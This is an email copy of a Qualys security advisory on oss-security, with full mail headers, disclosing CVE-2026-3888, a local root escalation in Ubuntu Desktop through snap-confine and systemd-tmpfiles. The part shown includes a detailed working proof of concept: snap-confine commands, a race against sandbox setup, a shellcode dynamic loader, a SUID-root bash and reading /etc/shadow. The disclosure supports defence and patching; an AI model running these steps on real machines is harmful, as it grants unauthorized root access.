Received: (qmail 30696 invoked by uid 550); 17 Mar 2026 19:33:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 30357 invoked from network); 17 Mar 2026 19:33:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
	content-id:content-transfer-encoding:content-type:date:from
	:message-id:mime-version:subject:to; s=qualyscom; bh=vTWdLHC+IUj
	JbQOMrlf+LfC9GmDSyZ+Qmz+cHCe+uCQ=; b=JTCdWrNPCAK7tA43qfqyuIxe/YU
	iCGfUn4WaZ3rb3/j35JgES3FB8r8p9RiSacS6VniLcxJatfBIVtFekLiEDnrxMjG
	4LGXLYxhC1ieG+eCl7BGEJbg5v3nPoFXK2xpqPlJAbZp2Gx9HA1UO+PDbjIU6cJZ
	JbASCFDOBjXUFfJM5cVCleBFq9snoCG3BAkVOi8kpDfTeH26FPYdjgT9JO0enCai
	ZRztWx+U7qY94G3ovmKXJ+B3CnJLRdpZM0z+b6qflh6bsSma846oFuCTxdSmyZ65
	zFVRCCi/Gfq2YELZrBcfkypHTPfyTDxjfAg5+KkFN6okx3sCnB5a3vpjnPw==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=F37HG+G8po7Bvn62a1Jbvck9qQh/IopTlc+7QELMzNdNL6oPpF3NEA2YAyAAwyy1IN+jXUuyv3uUYUKOUBbIl6p+8aL2/LsPjeDjqrNDvtTDsB6D+XOHzPvR8pqDXqkW/9uwRU5SaMo1helxkLaMizbF1l+wDMbU+tFEdUh/plbXFPrrS8vmlzW9yDOUdq+KHQWEcQT8mAVks0RLHuQeaYepo5dOqFOKQVUKfFWPmPh5txD8j3LYH7EPjSwxNWF0J3u0xhKorJj65cRK6jxZUWQHz2BmHIQxb1gCi4/0e/sMkgouhkwIZXXqO3EQ3M79INnAEWms84FUtBDuTwVlzw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=vTWdLHC+IUjJbQOMrlf+LfC9GmDSyZ+Qmz+cHCe+uCQ=;
 b=DcUTEtNxAJLj+XGm9wRP2V7pHSRb+FC4+6ZYkFpGvqr0gYcxR2mqiVFj9BAwn5q1EExrbHu697/gqhbxgULMzq7dCl3vKTdZ3lduie32Gbph3yYwKBQTZ1o/JQFjVDqlL5hnrSIE4oPmIdpQ+3iAQcxp2KCI/0KxCMPkTQGBiBYzMgRyfkXesxO3MtHfNJzzdmA5MD2/i7fFnsUSdQKjGcHTVzZ9LPEpl626GIZ+8xOuNAq40eI3cKtBnWjFEkrKbs+vD0TC5FdxeZ8f3QTqYFf2bWkhwG+aUic0ui0S7Q+1es4w29z87ABtzyAh+q8Ooy3yn+114hvFrEgGiwdBSg==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
 dkim=pass header.d=qualys.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=vTWdLHC+IUjJbQOMrlf+LfC9GmDSyZ+Qmz+cHCe+uCQ=;
 b=CbcZlGdfoa4rMYFds/dA9sWY6vHXnKKqQ03XDHZ5r+NavzJcVe4Ltp2fin6/MzDgMVJEw7hBpsqv2OfMHohf4ECXw+LHpRVYRc48n3WVqRACn3BTiOmKZ+EMjDdAUmFqdX1qvbhqd06a2EiCIgTEVI9mZHjW5kTmTioz6eP8gljEpZCe9dxfawjVHFoB7IFCzKex5nYjt9HengvZR/ZLJWVi/BZdrUjm7+FNCT3S5jwnOafH+b9/CX26nCA8zsReABzge0edxqBTRhgs1aZ7WAd9c0JOmGEW4hNTsZGX68RGDD8FZKDE4oRWiKnqUNvj6t8wkS3UGAZxCXbiDzgFpQ==
From: Qualys Security Advisory <qsa@qualys.com>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: snap-confine + systemd-tmpfiles = root (CVE-2026-3888)
Thread-Index: AQHctkTn6w3QdOeCE0CmPTALv6ujXg==
Date: Tue, 17 Mar 2026 19:33:16 +0000
Message-ID: <20260317193301.GA1285@localhost.localdomain>
Accept-Language: en-US
Content-Language: en-US
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: LV5PR06MB11218:EE_|BL4PR06MB9917:EE_
x-ms-office365-filtering-correlation-id: d3f82bb3-c480-4aef-f948-08de845c09cd
x-ms-exchange-senderadcheck: 1
x-ms-exchange-antispam-relay: 0
x-microsoft-antispam:
 BCL:0;ARA:13230040|1800799024|376014|366016|38070700021|18002099003|56012099003;
x-microsoft-antispam-message-info:
 3+dBFMt7TRoY34yjah2VEbG95WCw0pdrhHaFG3O8GLoNH8qnbGafQnuFNiQpO9Et1+XjVM+5y6O4JpstUDs00TjzshSZhP3mejUICFKrXYACOLj3ciDl12cYqD0m8m6XT4o9QdMkeMuEPpMTpyKEC9vVm4M8Rl2nS+l0oJfbJQ52ECUvXglTr+EUSqSh+yZD73QQ/OwxGEMdoPEuWxU06+Q2O6853niSnoR+OiZzTZK7eLVsA6pBxW0CTJf8n0vJwZ4+C/P6pchLVgqZzBe94UGik9+c6t+kNYPEkLumFLEnltN8E0SXalqe+0UcvRgF/PTaFV3l5t/feAgHM1rEIjD3z7Qp6hxV4/XNI5rQYTcWQqKJyfQXAvuRsjHW8ekzkwZprcHR9ihZxoPga+vcG5VBWrPyE9Xh5heRewUw5ZFZyGBCvJpG8LUGicyJ3h0aXIgxnTsIGlharTopY1mLvHGlVArtbQ0zLWRWGBEHmCjmVRFLoRrC4MwPW2S4a0F9lclNnf/6Q7NwjsS963JYxPwlZcmrQL2R/j57O6p+06zFqFFcOekaMbGfFvzMZwE2tKUkawa9T8G22J+ZkN7oi9oZV05AvIa0lzeoy3V+MBog9oSbbe+niv7XTH2ZKq0bNAt3iiL4gfYKqlg5++f8KQG50yJJ9j0CgU4mBkk1+8aUxuSyxrYKiCXQDSaRDkMs8oDeYtn0mdbT2lAWqn/I9cgpeqiv9eKbfZyc5f1ROoe5nqVilXaSmOKx7frtlt2M
x-forefront-antispam-report:
 CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:LV5PR06MB11218.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016)(38070700021)(18002099003)(56012099003);DIR:OUT;SFP:1102;
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?us-ascii?Q?FMXu9Q/HqQAvH7uQA6+K9uiyVwoHV6WKDt+65IWuWehMyDQT/6S2Wa2exIpo?=
 =?us-ascii?Q?u7NRZ1adNnz41DTziHcC7wT6Wr6LrwZBETaf7fFXEP5kgxxfi1OSNC8ozziC?=
 =?us-ascii?Q?eMW9my/eRSwk8LQG9CZLUd4XmuCpW7smsIyqtKePn8CqN/e/3Amfjq7dlSVp?=
 =?us-ascii?Q?/xjwK3im5xWFdJt+kU7Bz5oV/XOEg+u1Q+v8v2yKiE2NWbeBNk860vIIzBz1?=
 =?us-ascii?Q?RVt2m40Bzcfprd77WqH/IuRbWetbMny5vfpf+lZbA9ZUCo7n3FDtW0wCziOB?=
 =?us-ascii?Q?6xowiga0vNjmd3O0OxqKt91KrxrasqfuNGpQADIMk3vXHwbd+ihm/5aiPJh+?=
 =?us-ascii?Q?kKOjGLp5JceKKChDzFfu5PeVisRxgjM+aUb75exEORtsRtMAvHpV+dcS9jK/?=
 =?us-ascii?Q?0VxoHWXfAbTai2o+TXMs+K6ZXywVaG1BjjlCdVg3CX8VxuucSu1qDxh7AXmS?=
 =?us-ascii?Q?fOTQCbHI7MkgZKQqA0TN1zcaFHH72odCLb+aYuJqvYpehtxNHa8EtkaVoc8I?=
 =?us-ascii?Q?q3vOBsOBVdwbSBf1bzp05cmcHqNk7eMUFxfnwzegxkEInlvyJD7xWOWPMKvH?=
 =?us-ascii?Q?R+2WwMyBR3krcZL8Mnd9D+GsifYOidG3GbkQgEFf/KFYpHPwgANDFWlac9tJ?=
 =?us-ascii?Q?DH1JTORYclChyRQPtcdsDr7sjgfLyj2PUVH0eEd+r24pWTITNH/xfJWpddXd?=
 =?us-ascii?Q?g3AWH/YYQ3YI/zkRKBHmxyFRUBqPiRC5viihQ5X9fbAfEhXb1OGRe5jDhUx6?=
 =?us-ascii?Q?++7MSTqUy5Aa8pBatoo4rVb5uitEQVS2CMbS9R4RmxoZaimY3sRxR2hQmMhO?=
 =?us-ascii?Q?mJNG7zPqFc47fBCpIRLnIVJ2F+H5udU9wi1ZrEHSuY0ZMNhR9rczbR7zcyKr?=
 =?us-ascii?Q?zCHn1RiwMNiius9+FBeVYwVidXx5AUkVQEog/YQ4zRij7NpZnoh8G0dLHdI0?=
 =?us-ascii?Q?9oPyi1e3fEgwClYdmiywM/yadup9RHgWj5KJwmR4P3QgArN/mA81e0LO8aLC?=
 =?us-ascii?Q?g6uw8DhUuWBl6AUjYV/qMhokfSVUKqqxMl5KsfRulGmVHbuVHYjdZAYlaGWp?=
 =?us-ascii?Q?k828WsrXlGDMkC/JuSHGSe+Z5UrqggB62WLDTgGfjLPNupH+/yBTkoJn5oJI?=
 =?us-ascii?Q?AowzVxvRfm2Z0ikf6xH7KQRjeREg+d5lpSK5DScp2ly7J+2NLZiC8A4ki/RZ?=
 =?us-ascii?Q?ZF8s7UTZ4IKv/nXffKoEqt+2ZVrWIrEzuQo9PEAFcbJsbWV17FqpTDF5QkVC?=
 =?us-ascii?Q?YBeqcQp5PbvZjKmwHUEeBZc/FDjnD5Y32bufid82D5gOb98lqTcu4zzRr5mq?=
 =?us-ascii?Q?c/IBP8ri0uqaRNqB6WkwV0Zp0OWPKloujQaffZYr++ycODiXJA9hvvvDNgDR?=
 =?us-ascii?Q?M03dQdngZxtbB2b5cx3Xxj0TP2czGJpbzER2aNIK6Yf82tBpVRkmgINa7g/G?=
 =?us-ascii?Q?P5DqjYHvCFFeV4WHoZe2q3W32BZR2/Uue1jm6x2ELpspVwNM+iNRFWbLP4h9?=
 =?us-ascii?Q?kyNGf8H61aR1VAwp8J2tgC5+5t0rE/g/U4Rf0sV7sFNhZeRDWENdJJd5pkWY?=
 =?us-ascii?Q?lrXNc1712CHfhEZiuuor2A59TqUhDnSYh/OkU5D/QVa9b+mqXgqO3s9dYCtS?=
 =?us-ascii?Q?JAWumjeOxA3nNMEsxBvDU7D9rL9Zzy6nPBE2hqBel5c3oAoW/F3+Q7/chBs5?=
 =?us-ascii?Q?Jecl5fmDKi9syj0S+SnZKrvBu+Lr1F6ZxSKF3ngxSde3ARoeAvvf0NWtu4/O?=
 =?us-ascii?Q?upfzBTyy6oA568k4hbr/175Zb54STw0=3D?=
Content-Type: text/plain; charset="us-ascii"
Content-ID: <6B4C749B0C9E8C4FA221DC9BBFCDC361@namprd06.prod.outlook.com>
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
X-Exchange-RoutingPolicyChecked:
	MGkr+8sFvbAAIDqT2zv8LdIoMF5FvyHRpVZl2FeKf4SvRbEpDGq2rbM4FE0k4dmXgCzpsJzYCvkTQuMvCdOb7V/nxR9v4/Yl3Cn3adikDQ5zKIirvNR8Ojy6rV0i6su32ouFxc6M4tv/hHjS27egN8wFMBNbGjIqH1J5yd6a6INC2S9UtdUYw1rsqHHloHANEOheBusY6rqFd7qrvBIxingCijPM9q2AmcHGVzSnhwe2m9E2IqTanFqvQTYGs/3ZFnOaVaQ9L1phRTU0BkfMeMVx02M3H5+6WdOAODnVA5EyQjlGvnOZy3kK2/nwa1YjbIHGJRXQC4mYP9qMYw16LA==
X-OriginatorOrg: qualys.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: LV5PR06MB11218.namprd06.prod.outlook.com
X-MS-Exchange-CrossTenant-Network-Message-Id: d3f82bb3-c480-4aef-f948-08de845c09cd
X-MS-Exchange-CrossTenant-originalarrivaltime: 17 Mar 2026 19:33:16.9040
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
X-MS-Exchange-CrossTenant-userprincipalname: J4A29aMF3I02Z83vPuK949ywWf4KvOtF6HKi2odBwppM6O4ar7ifF77xvNCedGZWmphqkrTpGCugu9eICmMdfwpj8cMNrzIaFfVooj8wRLQ=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: BL4PR06MB9917
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
 definitions=2026-03-17_04,2026-03-17_02,2025-10-01_01
Subject: [oss-security] snap-confine + systemd-tmpfiles = root (CVE-2026-3888)


Qualys Security Advisory

Good things come to those who wait:
snap-confine + systemd-tmpfiles =3D root (CVE-2026-3888)


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Contents
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Summary
Case study: Ubuntu Desktop 24.04
- Analysis
- Exploitation
Case study: Ubuntu Desktop 25.10
- Overview
- Exploitation
A quick note on the uutils coreutils (the rust-coreutils)
Acknowledgments
Timeline

    And that is why Caterpillar was never in a hurry.
    She knew that good things come to those who wait.
        -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Summary
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We discovered an unusual Local Privilege Escalation (LPE), from any
unprivileged user to full root, in the default installation of Ubuntu
Desktop >=3D 24.04. We found this vulnerability particularly interesting:

a/ it stems from the interaction of two otherwise secure programs:

- snap-confine, which is set-user-ID-root (or set-capabilities), and
  "used internally by snapd to construct the execution environment for
  snap applications" (man snap-confine);

- systemd-tmpfiles, which is executed as root once per day, and
  "creates, deletes, and cleans up files and directories, using the
  configuration file format and location specified in tmpfiles.d(5)"
  (man systemd-tmpfiles);

b/ an unprivileged local attacker who wants to exploit this LPE must
wait for 10 days (in Ubuntu > 24.04) or 30 days (in Ubuntu 24.04) to
obtain a fully privileged root shell.

As a side note, we also discovered a local vulnerability (a race
condition) in the uutils coreutils (a Rust rewrite of the standard GNU
coreutils -- ls, cp, rm, cat, sort, etc), which are installed by default
in Ubuntu 25.10. This vulnerability was mitigated in Ubuntu 25.10 before
its release (by replacing the uutils coreutils' rm with the standard GNU
coreutils' rm), and would otherwise have resulted in an LPE (from any
unprivileged user to full root) in the default installation of Ubuntu
Desktop 25.10.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: Ubuntu Desktop 24.04
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Go slow, go slow,
    If you want to grow.
        -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"

________________________________________________________________________

Analysis
________________________________________________________________________

We recently noticed that, in the default installation of Ubuntu since
version 24.04, systemd-tmpfiles is configured to automatically clean up
the files and directories in /tmp that are older than 30 days (in Ubuntu
24.04) or 10 days (in Ubuntu > 24.04). More precisely, systemd-tmpfiles
traverses /tmp once per day and deletes all the files and directories
that have not been accessed nor modified for more than 10 or 30 days.

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
...

$ cat /usr/lib/tmpfiles.d/tmp.conf
...
D /tmp 1777 root root 30d
#q /var/tmp 1777 root root 30d
------------------------------------------------------------------------

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 25.10"
...

$ cat /usr/lib/tmpfiles.d/tmp.conf
...
q /tmp 1777 root root 10d
q /var/tmp 1777 root root 30d
------------------------------------------------------------------------

=46rom our "Lemmings" and "Leeloo" advisories, we then remembered that
snap-confine does highly privileged work in /tmp; in particular, in the
/tmp/snap-private-tmp directory, which is securely created at boot time
(as user root, mode 0700):

  https://www.qualys.com/2022/02/17/cve-2021-44731/oh-snap-more-lemmings.txt
  https://www.qualys.com/2022/11/30/cve-2022-3328/advisory-snap.txt

------------------------------------------------------------------------
$ cat /usr/lib/tmpfiles.d/snapd.conf
D! /tmp/snap-private-tmp 0700 root root -
------------------------------------------------------------------------

We therefore came up with the following idea: if, unbeknownst to
snap-confine, systemd-tmpfiles deletes one of the files or directories
from snap-confine's /tmp/snap-private-tmp, can we (an unprivileged local
attacker) re-create the deleted file or directory ourselves, and exploit
snap-confine's privileged work to obtain a fully privileged root shell?

Still from our "Lemmings" and "Leeloo" advisories, we also remembered
that, to set up a snap's sandbox, snap-confine creates a directory named
/tmp/snap-private-tmp/$SNAP/tmp (as user root, mode 01777) that is later
bind-mounted onto the /tmp directory inside the snap's sandbox.

And inside this /tmp directory (inside the snap's sandbox), snap-confine
creates a directory named /tmp/.snap (as user root, mode 0755) to create
"mimics"; for example, inside the sandbox of each and every snap that is
installed by default on Ubuntu Desktop, snap-confine bind-mounts the
/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 directory:

- to bind-mount this directory, snap-confine must first create its
  /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint, which does not
  normally exist;

- but inside the snap's sandbox, /usr/lib/x86_64-linux-gnu is in a
  read-only filesystem (the "core22" base's squashfs);

- so snap-confine must first create a "mimic" of
  /usr/lib/x86_64-linux-gnu (a writable copy of
  /usr/lib/x86_64-linux-gnu), by:

1/ bind-mounting the original, read-only /usr/lib/x86_64-linux-gnu onto
/tmp/.snap/usr/lib/x86_64-linux-gnu (inside the snap's sandbox);

2/ mounting a new, writable tmpfs onto /usr/lib/x86_64-linux-gnu;

3/ bind-mounting every file and directory from
/tmp/.snap/usr/lib/x86_64-linux-gnu back into /usr/lib/x86_64-linux-gnu;

4/ creating the /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 mountpoint
(which is in a writable tmpfs now);

5/ finally bind-mounting
/snap/firefox/6565/gnome-platform/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0
(for example) onto /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0.

------------------------------------------------------------------------
$ grep /usr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /var/lib/snapd/mount/*
/var/lib/snapd/mount/snap.firefox.fstab:/snap/firefox/6565/gnome-platform/u=
sr/lib/x86_64-linux-gnu/webkit2gtk-4.0 /usr/lib/x86_64-linux-gnu/webkit2gtk=
-4.0 none rbind,rw,x-snapd.origin=3Dlayout 0 0
...
------------------------------------------------------------------------

Consequently, our theoretical idea to exploit snap-confine is:

- inside the snap's sandbox, we frequently write to the /tmp directory
  (but not to /tmp/.snap), and patiently wait for systemd-tmpfiles to
  delete the unmodified /tmp/.snap directory (but not /tmp) after 10
  days (in Ubuntu > 24.04) or 30 days (in Ubuntu 24.04);

- we re-create the /tmp/.snap directory ourselves (indeed, /tmp is
  world-writable), and create our own copy of /usr/lib/x86_64-linux-gnu
  in /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange;

- we force snap-confine to set up the snap's sandbox afresh, but during
  the creation of the /usr/lib/x86_64-linux-gnu "mimic", between step 1/
  and step 3/, we quickly replace /tmp/.snap/usr/lib/x86_64-linux-gnu
  with our own /tmp/.snap/usr/lib/x86_64-linux-gnu.exchange (indeed,
  /tmp/.snap belongs to us);

- as a result, during step 3/ of the creation of this "mimic",
  snap-confine bind-mounts our own files into /usr/lib/x86_64-linux-gnu,
  so we control every shared library and the dynamic loader (inside the
  snap's sandbox) and can execute arbitrary code as root by simply
  executing any dynamically-linked SUID-root binary.

In the following proof of concept for Ubuntu Desktop 24.04, we put this
theoretical idea into practice.

________________________________________________________________________

Exploitation
________________________________________________________________________

First, we set up the sandbox of one of the snaps that are installed by
default on Ubuntu Desktop (the "firefox" snap) by executing snap-confine
with the "core22" base, then we obtain an unprivileged shell inside this
snap's sandbox, we chdir to its /tmp directory, we frequently write to
this directory (but not to its /tmp/.snap sub-directory), and we wait
for systemd-tmpfiles to delete the unmodified /tmp/.snap directory
(after 30 days, in Ubuntu 24.04).

------------------------------------------------------------------------
outside$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
...

outside$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)

outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
base core22 snap.firefox.hook.configure /bin/bash

inside$ cd /tmp

inside$ stat ./.snap
...
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
...

inside$ while test -d ./.snap; do touch ./; sleep 60; done
[30 days pass]

inside$ stat ./.snap
stat: cannot statx './.snap': No such file or directory
------------------------------------------------------------------------

Second, from another shell outside the snap's sandbox, we chdir to
/tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the snap's sandbox) through
the /proc/pid/cwd of our sandboxed shell (indeed, we cannot chdir to
/tmp/snap-private-tmp/$SNAP/tmp directly because /tmp/snap-private-tmp
belongs to root, mode 0700), we destroy the snap's sandbox (but not its
/tmp directory) by executing snap-confine with an invalid base (the
"snapd" base), and we run our firefox_24.04.c helper (which is basically
CVE-2021-44731-Desktop.c from our "Lemmings" advisory):

- we re-create the ./.snap directory ourselves (/tmp/.snap inside the
  snap's sandbox), since it was deleted by systemd-tmpfiles, and we
  create our own copy of /snap/core22/current/usr/lib/x86_64-linux-gnu
  in ./.snap/usr/lib/x86_64-linux-gnu.exchange;

- we force snap-confine to set up the snap's sandbox afresh, by
  executing it with the "core22" base, but we "single-step" this
  execution of snap-confine (we set SNAPD_DEBUG=3D1, we redirect its
  stderr to an AF_UNIX socket with minimized SO_RCVBUF and SO_SNDBUF, we
  read() its output byte by byte, and we recv(MSG_PEEK) at its buffered
  output), to reliably win the race condition between step 1/ and step
  3/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu;

- as soon as we read() or recv() the following message (immediately
  after step 1/ of the "mimic" creation of /usr/lib/x86_64-linux-gnu),

  mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap/usr/lib/x86_64-lin=
ux-gnu"

  we quickly replace snap-confine's ./.snap/usr/lib/x86_64-linux-gnu
  with our own ./.snap/usr/lib/x86_64-linux-gnu.exchange, whose contents
  are then bind-mounted into /usr/lib/x86_64-linux-gnu, thus giving us
  full control over every shared library and the dynamic loader inside
  the snap's sandbox.

------------------------------------------------------------------------
outside$ cd /proc/2396/cwd

outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
base snapd snap.firefox.hook.configure /nonexistent
/user.slice/user-1001.slice/session-145.scope is not a snap cgroup

outside$ systemd-run --user --scope --unit=3Dsnap.whatever /bin/bash
Running as unit: snap.whatever.scope; invocation ID: ed50ae80aa9844d6a6e449=
9ea1f4bba8

outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
base snapd snap.firefox.hook.configure /nonexistent
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_yMpga4//dev: =
No such file or directory

outside$ exit

outside$ ~/firefox_24.04
hange.go:351: DEBUG: mount name:"/usr/lib/x86_64-linux-gnu" dir:"/tmp/.snap=
/usr/lib/x86_64-linux-gnu" type:"" opts:MS_BIND|MS_REC unparsed:"" (error: =
<nil>)
change.go:351: DEBUG: mount name:"tmpfs" dir:"/usr/lib/x86_64-linux-gnu" ty=
pe:"tmpfs" opts: unparsed:"mode=3D0755,uid=3D0,gid=3D0" (error: <nil>)
...
change.go:351: DEBUG: mount name:"/tmp/.snap/usr/lib/x86_64-linux-gnu/ld-li=
nux-x86-64.so.2" dir:"/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" type:=
"" opts:MS_BIND unparsed:"" (error: <nil>)
...
change.go:351: DEBUG: mount name:"/snap/firefox/6565/gnome-platform/usr/lib=
/x86_64-linux-gnu/webkit2gtk-4.0" dir:"/usr/lib/x86_64-linux-gnu/webkit2gtk=
-4.0" type:"none" opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
...
execv failed: No such file or directory
------------------------------------------------------------------------

Third, we obtain an unprivileged shell inside this newly set up sandbox,
by executing snap-confine with the same "core22" base; and from another
shell outside this snap's sandbox, we chdir to its / directory, through
the /proc/pid/root of our sandboxed shell, we copy /usr/bin/busybox to
./tmp/sh (/tmp/sh inside the snap's sandbox), and we overwrite the
dynamic loader ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 (which
belongs to us) with a simple shellcode that calls setreuid(0) and
execve(/tmp/sh) (a busybox shell).

------------------------------------------------------------------------
outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
base core22 snap.firefox.hook.configure /bin/bash
inside$=20
------------------------------------------------------------------------

------------------------------------------------------------------------
outside$ cd /proc/4516/root

outside$ cp /usr/bin/busybox ./tmp/sh

outside$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64=
.so.2
------------------------------------------------------------------------

Fourth, we obtain a root shell inside the snap's sandbox, by executing
snap-confine itself through snap-confine, which is dynamically linked
and SUID-root and therefore executes our own dynamic loader's shellcode
(and hence a busybox shell) as root. (Note: the snap's sandbox contains
various SUID-root binaries, but only the execution of snap-confine is
allowed by its AppArmor profile.)

------------------------------------------------------------------------
outside$ env -i SNAP_INSTANCE_NAME=3Dfirefox /usr/lib/snapd/snap-confine --=
base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
...
BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
...

inside# id
uid=3D0(root) gid=3D1001(jane) groups=3D100(users),1001(jane)
^^^^^^^^^^^

inside# cat /etc/shadow
cat: can't open '/etc/shadow': Permission denied
------------------------------------------------------------------------

Fifth, because this root shell is still inside the snap's sandbox,
confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
allowed by the AppArmor profile and the seccomp filter), and execute
this SUID-root shell from outside the snap's sandbox, thereby finally
gaining full root privileges.

------------------------------------------------------------------------
inside# cp /bin/bash /var/snap/firefox/common/

inside# chmod 04755 /var/snap/firefox/common/bash

inside# exit

outside$ /var/snap/firefox/common/bash -p

outside# id
uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane),100(us=
ers)
                              ^^^^^^^^^^^^

outside# cat /etc/shadow
root:*:20305:0:99999:7:::
daemon:*:20305:0:99999:7:::
...
------------------------------------------------------------------------


